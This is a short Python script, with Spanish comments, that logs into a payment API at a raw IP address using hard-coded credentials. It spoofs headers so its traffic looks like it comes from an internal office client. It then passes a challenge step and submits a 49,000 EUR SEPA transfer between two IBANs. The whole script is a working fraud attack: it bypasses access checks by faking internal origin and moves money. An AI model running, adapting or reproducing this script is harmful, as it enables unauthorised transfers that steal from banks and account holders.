import requests

# === URLs
login_url = "http://80.78.30.242:9181/api/login/"
challenge_url = "http://80.78.30.242:9181/api/challenge"
transfer_url = "http://80.78.30.242:9181/api/send-transfer"

# === Credenciales ===
user = "493069k1"
passwd = "bar1588623"

# === IP interna fingida ===
session = requests.Session()
session.headers.update({
    "Host": "api.coretransapi.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 (Internal Browser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES;q=0.9,en;q=0.7",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES-9181",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip, deflate, br",
})


# === Paso 1: Hacer POST de login y ver si devuelve token real ===
payload = {
    "username": user,
    "password": passwd
}

login_response = session.post(login_url, json=payload)

if login_response.status_code in [200, 201]:
    print("[+] ¡Login exitoso!")
    auth_token = login_response.json().get("access_token") or login_response.json().get("token") or login_response.json().get("api_token")

    if auth_token:
        session.headers.update({
            "Authorization": f"Bearer {auth_token}"
        })

        # === Paso 2: Hacer el challenge o la verificación ===
        challenge_response = session.post(challenge_url, json={"token": auth_token})
        if challenge_response.status_code in [200, 201]:
            print("[*] Desafío aceptado:", challenge_response.text)

            # === Paso 3: Enviar la transferencia SEPA directa desde token interno ===
            transfer_data = {
                "iban_origen": "ES12345678901234567890",
                "iban_destino": "ES98765432109876543210",
                "monto": 49000.00,
                "concepto": "Transfer interbancario",
            }

            transfer_response = session.post(transfer_url, json=transfer_data)
            print("\n[+] Resultado de transferencia SEPA:")
            print(transfer_response.status_code)
            print(transfer_response.text)
        else:
            print("[-] Challenge rechazado. Status:", challenge_response.status_code)
    else:
        print("[-] No se obtuvo token tras login.")
        print(login_response.text)
else:
    print("[-] Login fallido. Status:", login_response.status_code)
    print(login_response.text)